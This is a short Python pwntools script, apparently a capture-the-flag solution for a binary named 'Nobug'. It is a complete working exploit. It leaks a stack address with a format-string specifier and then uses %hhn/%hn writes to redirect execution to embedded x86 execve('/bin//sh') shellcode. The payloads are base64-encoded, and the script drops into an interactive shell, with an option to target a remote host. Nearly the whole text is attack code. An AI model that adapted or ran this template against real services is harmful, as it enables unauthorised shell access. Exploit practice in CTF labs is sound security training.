from pwn import *
import base64

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x8048bbb
b* 0x8048be6
continue
'''.format(**locals())

#Binary filename
exe = './Nobug'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()

shell_addr = 0x804a0a0
shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = base64.b64encode(b"%4$p")
p.sendline(payload)
target_addr = int(p.recvuntil("\n"), 16) + 4
info(hex(target_addr))
seg = "%" + str((target_addr & 0xff) - len(shellcode))+ "c%4$hhn"
seg += "%" + str((shell_addr & 0xff) - (target_addr & 0xff)) + "c%12$hn"

payload = base64.b64encode(shellcode + seg.encode())
p.sendline(payload)

p.interactive()
